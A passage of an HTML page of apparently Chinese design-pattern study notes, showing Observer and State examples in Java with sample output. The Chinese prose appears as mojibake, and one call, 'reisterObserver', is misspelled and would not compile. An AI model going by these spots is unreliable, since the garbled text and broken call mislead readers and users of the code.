</code></pre></div><h3 id="jdk-10" tabindex="-1"> JDK</h3>
<ul>
<li>java.io.Serializable</li>
</ul>
<h2 id="_7-è§‚å¯Ÿè€…-observer" tabindex="-1"> 7. è§‚å¯Ÿè€…ï¼ˆObserverï¼‰</h2>
<h3 id="intent-12" tabindex="-1"> Intent</h3>
<p>å®šä¹‰å¯¹è±¡ä¹‹é—´çš„ä¸€å¯¹å¤šä¾èµ–ï¼Œå½“ä¸€ä¸ªå¯¹è±¡çŠ¶æ€æ”¹å˜æ—¶ï¼Œå®ƒçš„æ‰€æœ‰ä¾èµ–éƒ½ä¼šæ”¶åˆ°é€šçŸ¥å¹¶ä¸”è‡ªåŠ¨æ›´æ–°çŠ¶æ€ã€‚</p>
<p>ä¸»é¢˜ï¼ˆSubjectï¼‰æ˜¯è¢«è§‚å¯Ÿçš„å¯¹è±¡ï¼Œè€Œå…¶æ‰€æœ‰ä¾èµ–è€…ï¼ˆObserverï¼‰ç§°ä¸ºè§‚å¯Ÿè€…ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7a3c6a30-c735-4edb-8115-337288a4f0f2.jpg" width="600"/> </div><br>
<h3 id="class-diagram-12" tabindex="-1"> Class Diagram</h3>
<p>ä¸»é¢˜ï¼ˆSubjectï¼‰å…·æœ‰æ³¨å†Œå’Œç§»é™¤è§‚å¯Ÿè€…ã€å¹¶é€šçŸ¥æ‰€æœ‰è§‚å¯Ÿè€…çš„åŠŸèƒ½ï¼Œä¸»é¢˜æ˜¯é€šè¿‡ç»´æŠ¤ä¸€å¼ è§‚å¯Ÿè€…åˆ—è¡¨æ¥å®ç°è¿™äº›æ“ä½œçš„ã€‚</p>
<p>è§‚å¯Ÿè€…ï¼ˆObserverï¼‰çš„æ³¨å†ŒåŠŸèƒ½éœ€è¦è°ƒç”¨ä¸»é¢˜çš„ registerObserver() æ–¹æ³•ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a8c8f894-a712-447c-9906-5caef6a016e3.png"/> </div><br>
<h3 id="implementation-12" tabindex="-1"> Implementation</h3>
<p>å¤©æ°”æ•°æ®å¸ƒå‘Šæ¿ä¼šåœ¨å¤©æ°”ä¿¡æ¯å‘ç”Ÿæ”¹å˜æ—¶æ›´æ–°å…¶å†…å®¹ï¼Œå¸ƒå‘Šæ¿æœ‰å¤šä¸ªï¼Œå¹¶ä¸”åœ¨å°†æ¥ä¼šç»§ç»­å¢åŠ ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b1df9732-86ce-4d69-9f06-fba1db7b3b5a.jpg"/> </div><br>
<div><pre><code><span>public</span> <span>interface</span> <span>Subject</span> <span>{</span>
    <span>void</span> <span>registerObserver</span><span>(</span><span>Observer</span> o<span>)</span><span>;</span>

    <span>void</span> <span>removeObserver</span><span>(</span><span>Observer</span> o<span>)</span><span>;</span>

    <span>void</span> <span>notifyObserver</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>WeatherData</span> <span>implements</span> <span>Subject</span> <span>{</span>
    <span>private</span> <span>List</span><span><span>&lt;</span><span>Observer</span><span>></span></span> observers<span>;</span>
    <span>private</span> <span>float</span> temperature<span>;</span>
    <span>private</span> <span>float</span> humidity<span>;</span>
    <span>private</span> <span>float</span> pressure<span>;</span>

    <span>public</span> <span>WeatherData</span><span>(</span><span>)</span> <span>{</span>
        observers <span>=</span> <span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setMeasurements</span><span>(</span><span>float</span> temperature<span>,</span> <span>float</span> humidity<span>,</span> <span>float</span> pressure<span>)</span> <span>{</span>
        <span>this</span><span>.</span>temperature <span>=</span> temperature<span>;</span>
        <span>this</span><span>.</span>humidity <span>=</span> humidity<span>;</span>
        <span>this</span><span>.</span>pressure <span>=</span> pressure<span>;</span>
        <span>notifyObserver</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>registerObserver</span><span>(</span><span>Observer</span> o<span>)</span> <span>{</span>
        observers<span>.</span><span>add</span><span>(</span>o<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>removeObserver</span><span>(</span><span>Observer</span> o<span>)</span> <span>{</span>
        <span>int</span> i <span>=</span> observers<span>.</span><span>indexOf</span><span>(</span>o<span>)</span><span>;</span>
        <span>if</span> <span>(</span>i <span>>=</span> <span>0</span><span>)</span> <span>{</span>
            observers<span>.</span><span>remove</span><span>(</span>i<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>notifyObserver</span><span>(</span><span>)</span> <span>{</span>
        <span>for</span> <span>(</span><span>Observer</span> o <span>:</span> observers<span>)</span> <span>{</span>
            o<span>.</span><span>update</span><span>(</span>temperature<span>,</span> humidity<span>,</span> pressure<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br></div></div><div><pre><code><span>public</span> <span>interface</span> <span>Observer</span> <span>{</span>
    <span>void</span> <span>update</span><span>(</span><span>float</span> temp<span>,</span> <span>float</span> humidity<span>,</span> <span>float</span> pressure<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>StatisticsDisplay</span> <span>implements</span> <span>Observer</span> <span>{</span>

    <span>public</span> <span>StatisticsDisplay</span><span>(</span><span>Subject</span> weatherData<span>)</span> <span>{</span>
        weatherData<span>.</span><span>reisterObserver</span><span>(</span><span>this</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>update</span><span>(</span><span>float</span> temp<span>,</span> <span>float</span> humidity<span>,</span> <span>float</span> pressure<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"StatisticsDisplay.update: "</span> <span>+</span> temp <span>+</span> <span>" "</span> <span>+</span> humidity <span>+</span> <span>" "</span> <span>+</span> pressure<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>CurrentConditionsDisplay</span> <span>implements</span> <span>Observer</span> <span>{</span>

    <span>public</span> <span>CurrentConditionsDisplay</span><span>(</span><span>Subject</span> weatherData<span>)</span> <span>{</span>
        weatherData<span>.</span><span>registerObserver</span><span>(</span><span>this</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>update</span><span>(</span><span>float</span> temp<span>,</span> <span>float</span> humidity<span>,</span> <span>float</span> pressure<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"CurrentConditionsDisplay.update: "</span> <span>+</span> temp <span>+</span> <span>" "</span> <span>+</span> humidity <span>+</span> <span>" "</span> <span>+</span> pressure<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>WeatherStation</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>WeatherData</span> weatherData <span>=</span> <span>new</span> <span>WeatherData</span><span>(</span><span>)</span><span>;</span>
        <span>CurrentConditionsDisplay</span> currentConditionsDisplay <span>=</span> <span>new</span> <span>CurrentConditionsDisplay</span><span>(</span>weatherData<span>)</span><span>;</span>
        <span>StatisticsDisplay</span> statisticsDisplay <span>=</span> <span>new</span> <span>StatisticsDisplay</span><span>(</span>weatherData<span>)</span><span>;</span>

        weatherData<span>.</span><span>setMeasurements</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>)</span><span>;</span>
        weatherData<span>.</span><span>setMeasurements</span><span>(</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code>CurrentConditionsDisplay.update: 0.0 0.0 0.0
StatisticsDisplay.update: 0.0 0.0 0.0
CurrentConditionsDisplay.update: 1.0 1.0 1.0
StatisticsDisplay.update: 1.0 1.0 1.0
</code></pre></div><h3 id="jdk-11" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Observer.html" target="_blank" rel="noopener noreferrer">java.util.Observer</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/EventListener.html" target="_blank" rel="noopener noreferrer">java.util.EventListener</a></li>
<li><a href="http://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpSessionBindingListener.html" target="_blank" rel="noopener noreferrer">javax.servlet.http.HttpSessionBindingListener</a></li>
<li><a href="https://github.com/ReactiveX/RxJava" target="_blank" rel="noopener noreferrer">RxJava</a></li>
</ul>
<h2 id="_8-çŠ¶æ€-state" tabindex="-1"> 8. çŠ¶æ€ï¼ˆStateï¼‰</h2>
<h3 id="intent-13" tabindex="-1"> Intent</h3>
<p>å…è®¸å¯¹è±¡åœ¨å†…éƒ¨çŠ¶æ€æ”¹å˜æ—¶æ”¹å˜å®ƒçš„è¡Œä¸ºï¼Œå¯¹è±¡çœ‹èµ·æ¥å¥½åƒä¿®æ”¹äº†å®ƒæ‰€å±çš„ç±»ã€‚</p>
<h3 id="class-diagram-13" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/79df886f-fdc3-4020-a07f-c991bb58e0d8.png"/> </div><br>
<h3 id="implementation-13" tabindex="-1"> Implementation</h3>
<p>ç³–æœé”€å”®æœºæœ‰å¤šç§çŠ¶æ€ï¼Œæ¯ç§çŠ¶æ€ä¸‹é”€å”®æœºæœ‰ä¸åŒçš„è¡Œä¸ºï¼ŒçŠ¶æ€å¯ä»¥å‘ç”Ÿè½¬ç§»ï¼Œä½¿å¾—é”€å”®æœºçš„è¡Œä¸ºä¹Ÿå‘ç”Ÿæ”¹å˜ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/396be981-3f2c-4fd9-8101-dbf9c841504b.jpg" width="600"/> </div><br>
<div><pre><code><span>public</span> <span>interface</span> <span>State</span> <span>{</span>
    <span>/**
     * æŠ•å…¥ 25 åˆ†é’±
     */</span>
    <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span><span>;</span>

    <span>/**
     * é€€å› 25 åˆ†é’±
     */</span>
    <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span><span>;</span>

    <span>/**
     * è½¬åŠ¨æ›²æŸ„
     */</span>
    <span>void</span> <span>turnCrank</span><span>(</span><span>)</span><span>;</span>

    <span>/**
     * å‘æ”¾ç³–æœ
     */</span>
    <span>void</span> <span>dispense</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>HasQuarterState</span> <span>implements</span> <span>State</span> <span>{</span>

    <span>private</span> <span>GumballMachine</span> gumballMachine<span>;</span>

    <span>public</span> <span>HasQuarterState</span><span>(</span><span>GumballMachine</span> gumballMachine<span>)</span> <span>{</span>
        <span>this</span><span>.</span>gumballMachine <span>=</span> gumballMachine<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You can't insert another quarter"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Quarter returned"</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>setState</span><span>(</span>gumballMachine<span>.</span><span>getNoQuarterState</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>turnCrank</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You turned..."</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>setState</span><span>(</span>gumballMachine<span>.</span><span>getSoldState</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>dispense</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"No gumball dispensed"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>NoQuarterState</span> <span>implements</span> <span>State</span> <span>{</span>

    <span>GumballMachine</span> gumballMachine<span>;</span>

    <span>public</span> <span>NoQuarterState</span><span>(</span><span>GumballMachine</span> gumballMachine<span>)</span> <span>{</span>
        <span>this</span><span>.</span>gumballMachine <span>=</span> gumballMachine<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You insert a quarter"</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>setState</span><span>(</span>gumballMachine<span>.</span><span>getHasQuarterState</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You haven't insert a quarter"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>turnCrank</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You turned, but there's no quarter"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>dispense</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You need to pay first"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>SoldOutState</span> <span>implements</span> <span>State</span> <span>{</span>

    <span>GumballMachine</span> gumballMachine<span>;</span>

    <span>public</span> <span>SoldOutState</span><span>(</span><span>GumballMachine</span> gumballMachine<span>)</span> <span>{</span>
        <span>this</span><span>.</span>gumballMachine <span>=</span> gumballMachine<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You can't insert a quarter, the machine is sold out"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You can't eject, you haven't inserted a quarter yet"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>turnCrank</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You turned, but there are no gumballs"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>dispense</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"No gumball dispensed"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>SoldState</span> <span>implements</span> <span>State</span> <span>{</span>

    <span>GumballMachine</span> gumballMachine<span>;</span>

    <span>public</span> <span>SoldState</span><span>(</span><span>GumballMachine</span> gumballMachine<span>)</span> <span>{</span>
        <span>this</span><span>.</span>gumballMachine <span>=</span> gumballMachine<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Please wait, we're already giving you a gumball"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Sorry, you already turned the crank"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>turnCrank</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Turning twice doesn't get you another gumball!"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>dispense</span><span>(</span><span>)</span> <span>{</span>
        gumballMachine<span>.</span><span>releaseBall</span><span>(</span><span>)</span><span>;</span>
        <span>if</span> <span>(</span>gumballMachine<span>.</span><span>getCount</span><span>(</span><span>)</span> <span>></span> <span>0</span><span>)</span> <span>{</span>
            gumballMachine<span>.</span><span>setState</span><span>(</span>gumballMachine<span>.</span><span>getNoQuarterState</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Oops, out of gumballs"</span><span>)</span><span>;</span>
            gumballMachine<span>.</span><span>setState</span><span>(</span>gumballMachine<span>.</span><span>getSoldOutState</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>GumballMachine</span> <span>{</span>

    <span>private</span> <span>State</span> soldOutState<span>;</span>
    <span>private</span> <span>State</span> noQuarterState<span>;</span>
    <span>private</span> <span>State</span> hasQuarterState<span>;</span>
    <span>private</span> <span>State</span> soldState<span>;</span>

    <span>private</span> <span>State</span> state<span>;</span>
    <span>private</span> <span>int</span> count <span>=</span> <span>0</span><span>;</span>

    <span>public</span> <span>GumballMachine</span><span>(</span><span>int</span> numberGumballs<span>)</span> <span>{</span>
        count <span>=</span> numberGumballs<span>;</span>
        soldOutState <span>=</span> <span>new</span> <span>SoldOutState</span><span>(</span><span>this</span><span>)</span><span>;</span>
        noQuarterState <span>=</span> <span>new</span> <span>NoQuarterState</span><span>(</span><span>this</span><span>)</span><span>;</span>
        hasQuarterState <span>=</span> <span>new</span> <span>HasQuarterState</span><span>(</span><span>this</span><span>)</span><span>;</span>
        soldState <span>=</span> <span>new</span> <span>SoldState</span><span>(</span><span>this</span><span>)</span><span>;</span>

        <span>if</span> <span>(</span>numberGumballs <span>></span> <span>0</span><span>)</span> <span>{</span>
            state <span>=</span> noQuarterState<span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
            state <span>=</span> soldOutState<span>;</span>
        <span>}</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span> <span>{</span>
        state<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span> <span>{</span>
        state<span>.</span><span>ejectQuarter</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>turnCrank</span><span>(</span><span>)</span> <span>{</span>
        state<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
        state<span>.</span><span>dispense</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setState</span><span>(</span><span>State</span> state<span>)</span> <span>{</span>
        <span>this</span><span>.</span>state <span>=</span> state<span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>releaseBall</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"A gumball comes rolling out the slot..."</span><span>)</span><span>;</span>
        <span>if</span> <span>(</span>count <span>!=</span> <span>0</span><span>)</span> <span>{</span>
            count <span>-=</span> <span>1</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>public</span> <span>State</span> <span>getSoldOutState</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> soldOutState<span>;</span>
    <span>}</span>

    <span>public</span> <span>State</span> <span>getNoQuarterState</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> noQuarterState<span>;</span>
    <span>}</span>

    <span>public</span> <span>State</span> <span>getHasQuarterState</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> hasQuarterState<span>;</span>
    <span>}</span>

    <span>public</span> <span>State</span> <span>getSoldState</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> soldState<span>;</span>
    <span>}</span>

    <span>public</span> <span>int</span> <span>getCount</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> count<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>GumballMachine</span> gumballMachine <span>=</span> <span>new</span> <span>GumballMachine</span><span>(</span><span>5</span><span>)</span><span>;</span>

        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>

        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>ejectQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>

        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>ejectQuarter</span><span>(</span><span>)</span><span>;</span>

        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><div><pre><code>You insert a quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
Quarter returned
You turned, but there's no quarter
You need to pay first
You insert a quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
You turned...
A gumball comes rolling out the slot...
You haven't insert a quarter
You insert a quarter
You can't insert another quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
You turned...
A gumball comes rolling out the slot...
Oops, out of gumballs
You can't insert a quarter, the machine is sold out
You turned, but there are no gumballs
No gumball dispensed
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h2 id="_9-ç­–ç•¥-strategy" tabindex="-1"> 9. ç­–ç•¥ï¼ˆStrategyï¼‰</h2>
<h3 id="intent-14" tabindex="-1"> Intent</h3>
<p>å®šä¹‰ä¸€ç³»åˆ—ç®—æ³•ï¼Œå°è£…æ¯ä¸ªç®—æ³•ï¼Œå¹¶ä½¿å®ƒä»¬å¯ä»¥äº’æ¢ã€‚</p>
